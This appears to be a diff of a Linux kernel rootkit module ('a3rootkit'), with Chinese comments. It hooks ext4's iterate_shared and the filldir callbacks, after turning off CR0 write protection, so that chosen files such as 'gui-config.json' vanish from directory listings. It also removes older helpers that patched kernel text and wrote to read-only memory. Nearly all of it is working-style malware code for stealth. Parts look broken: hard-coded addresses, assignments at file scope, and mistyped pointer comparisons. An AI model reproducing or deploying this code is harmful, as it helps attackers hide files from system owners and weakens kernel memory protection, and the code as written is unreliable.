@@ -7,6 +7,8 @@
 #include <asm/pgtable.h>
 #include <asm-generic/memory_model.h>
 #include <asm/pgtable_types.h>
+#include <asm/current.h>
+#include <linux/sched.h>
 
 #define DEVICE_NAME "a3rootkit"
 #define CLASS_NAME "a3rootkit"
@@ -40,15 +42,19 @@ struct hook_info {
     size_t (*hook_after) (size_t orig_ret, size_t *args);
 };
 
-struct hook_info filldir_hook_info,filldir64_hook_info,compat_filldir_hook_info;
-filldir_t filldir, filldir64, compat_filldir;
 
 struct hide_file_info {
     struct list_head list;
     char *file_name;
 };
 
+filldir_t* filldir, filldir64, compat_filldir;
+struct file_operations *ext4_dir_operations;
 struct list_head hide_file_list;
+
+filldir = (filldir_t*)(0xffffffff9d29c7c0);
+filldir64 = (filldir_t*)(0xffffffff9d29c620);
+compat_filldir = (filldir_t*)(0xffffffff9d29bcb0);
 
 //读取cr0寄存器
 size_t a3_rootkit_read_cr0(void)
@@ -100,89 +106,77 @@ void a3_rootkit_enable_write_protect(void)
     }
 }
 
-void a3_rootkit_write_read_only_mem_by_cr0(void *dst, void *src,size_t len)
-{
-    size_t orig_cr0;
-
-    orig_cr0 = a3_rootkit_read_cr0();
-
-    a3_rootkit_disable_write_protect();
-
-    memcpy(dst, src, len);
-
-    /* if write protection is originally disabled, just do nothing */
-    if ((orig_cr0 >> 16) & 1) {
-        a3_rootkit_enable_write_protect();
-    }
-}
-
-void a3_rootkit_write_romem_by_pte_patch(void *dst, void *src, size_t len)
-{
-    pte_t *dst_pte;
-    pte_t orig_pte_val;
-    unsigned int level;
-
-    dst_pte = lookup_address((unsigned long) dst, &level);
-    orig_pte_val.pte = dst_pte->pte;
-
-    dst_pte->pte |= _PAGE_RW;
-    memcpy(dst, src, len);
-
-    dst_pte->pte = orig_pte_val.pte;
-}
-
-/* 一共要 hook 三个函数，因此还有另外两个和这个函数一模一样的函数，就不重复 copy 代码了：） */
-size_t a3_rootkit_evil_filldir(size_t arg0, size_t arg1, size_t arg2, 
-                               size_t arg3, size_t arg4, size_t arg5)
+int a3_rootkit_check_file_to_hide(const char *filename, int namlen)
 {
     struct hide_file_info *info = NULL;
-    size_t args[6], ret;
-
-    args[0] = arg0;
-    args[1] = arg1;
-    args[2] = arg2;
-    args[3] = arg3;
-    args[4] = arg4;
-    args[5] = arg5;
-
-    /* patch and call the original function */
-    a3_rootkit_write_read_only_mem_by_ioremap(filldir_hook_info.orig_func, 
-                                              filldir_hook_info.orig_data, 
-                                              HOOK_BUF_SZ);
 
     /* check for whether the file to be hide is in result and delete them */
     list_for_each_entry(info, &hide_file_list, list) {
-        if (!strncmp(info->file_name, args[1], args[2])) {
-            ret = 1; /* it should be true, otherwise the iterate will stop */
-            goto hide_out;
+        if (!strncmp(info->file_name, filename, namlen)) {
+            return 1;
         }
     }
 
-    /* normally fill */
-    ret = filldir_hook_info.orig_func(args[0], args[1], args[2], 
-                                      args[3], args[4], args[5]);
-
-hide_out:
-    /* re-patch the hook point again */
-    a3_rootkit_write_read_only_mem_by_ioremap(filldir_hook_info.orig_func, 
-                                              filldir_hook_info.hook_data, 
-                                              HOOK_BUF_SZ);
-
-    return ret;
+    return 0;
 }
 
-//...
-
-/* 你需要在模块初始化函数中调用该函数 */
-void a3_rootkit_hide_file_subsystem_init(void)
+static int a3_rootkit_fake_filldir(struct dir_context *ctx, const char *name,
+                                   int namlen, loff_t offset, u64 ino, 
+                                   unsigned int d_type)
 {
-    INIT_LIST_HEAD(&hide_file_list);
-    a3_rootkit_text_hook(filldir, a3_rootkit_evil_filldir, 
-                         &filldir_hook_info);
-    a3_rootkit_text_hook(filldir64, a3_rootkit_evil_filldir64, 
-                         &filldir64_hook_info);
-    a3_rootkit_text_hook(compat_filldir, a3_rootkit_evil_compat_filldir, 
-                         &compat_filldir_hook_info);
+    if (a3_rootkit_check_file_to_hide(name, namlen)) {
+        return 1;
+    }
+
+    return filldir(ctx, name, namlen, offset, ino, d_type);
+}
+
+static int a3_rootkit_fake_filldir64(struct dir_context *ctx, const char *name,
+                                     int namlen, loff_t offset, u64 ino, 
+                                     unsigned int d_type)
+{
+    if (a3_rootkit_check_file_to_hide(name, namlen)) {
+        return 1;
+    }
+
+    return filldir64(ctx, name, namlen, offset, ino, d_type);
+}
+
+static int a3_rootkit_fake_compat_filldir(struct dir_context *ctx, const char *name,
+                                          int namlen, loff_t offset, u64 ino, 
+                                          unsigned int d_type)
+{
+    if (a3_rootkit_check_file_to_hide(name, namlen)) {
+        return 1;
+    }
+
+    return compat_filldir(ctx, name, namlen, offset, ino, d_type);
+}
+
+int (*orig_ext4_iterate_shared) (struct file *, struct dir_context *);
+
+static int a3_rootkit_fake_ext4_iterate_shared(struct file *file, 
+                                               struct dir_context *ctx)
+{
+    printk("ctx->actor pointer is %p filldir address:%p \n", ctx->actor, filldir);
+    //if (ctx->actor == filldir) {
+    if (ctx->actor == 0xffffffff9d29c7c0) {
+        ctx->actor = (void*) a3_rootkit_fake_filldir;
+        printk(" ctx->actor = a3_rootkit_fake_filldir");
+    //} else if (ctx->actor == filldir64) {
+    } else if (ctx->actor == 0xffffffff9d29c620) {
+        ctx->actor = (void*) a3_rootkit_fake_filldir64;
+        printk(" ctx->actor = a3_rootkit_fake_filldir64");
+    //} else if (ctx->actor == compat_filldir) {
+    } else if (ctx->actor == 0xffffffff9d29bcb0) {
+        ctx->actor = (void*) a3_rootkit_fake_compat_filldir;
+        printk(" ctx->actor = a3_rootkit_fake_compat_filldir");
+    } else {
+        printk("Unexpected ctx->actor!");
+        //panic("Unexpected ctx->actor!");//这行代码挺危险，因为在自己hook之前别人已经hook了，所以得到的地址可能在case之外
+    }
+
+    return orig_ext4_iterate_shared(file, ctx);
 }
 
 /* 这个函数用来添加新的隐藏文件：） */
@@ -197,9 +191,37 @@ void a3_rootkit_add_new_hide_file(const char *file_name)
     list_add(&info->list, &hide_file_list);
 }
 
+/* 你需要在模块初始化函数中调用该函数 */
+void a3_rootkit_vfs_hide_file_subsystem_init(void)
+{
+    struct file *file;
+
+    INIT_LIST_HEAD(&hide_file_list);
+    a3_rootkit_add_new_hide_file("gui-config.json");
+
+    a3_rootkit_disable_write_protect();
+
+    file = filp_open("/", O_RDONLY, 0);
+    if (IS_ERR(file)) {
+        goto out;
+    }
+
+    ext4_dir_operations = file->f_op;
+    printk(KERN_ERR "Got addr of ext4_dir_operations: %lx",ext4_dir_operations);
+    orig_ext4_iterate_shared = ext4_dir_operations->iterate_shared;
+    ext4_dir_operations->iterate_shared = a3_rootkit_fake_ext4_iterate_shared;
+
+    filp_close(file, NULL);
+
+
+out:
+    a3_rootkit_enable_write_protect();
+}
+
 static int __init a3_rootkit_init(void)
 {
     int err_code;
+    a3_rootkit_vfs_hide_file_subsystem_init();
 
     printk(KERN_INFO"[a3_rootkit:] Module loaded. Start to register device...");
 
@@ -250,18 +272,6 @@ static void __exit a3_rootkit_exit(void)
     printk(KERN_INFO "[a3_rootkit:] Module clean up. See you next time.");
 }
 
-void a3_rootkit_write_read_only_mem_by_ioremap(void *dst, void *src, size_t len)
-{
-    size_t dst_phys_page_addr, dst_offset;
-    void* dst_ioremap_addr;
-
-    dst_phys_page_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;
-    dst_offset = (size_t) dst & 0xfff;
-
-    dst_ioremap_addr = (void*) ioremap(dst_phys_page_addr, len + 0x1000);
-    memcpy((void*)(dst_ioremap_addr + dst_offset), src, len);
-    iounmap(dst_ioremap_addr);
-}
 
 static int a3_rootkit_open(struct inode *inode, struct file *file)
 {
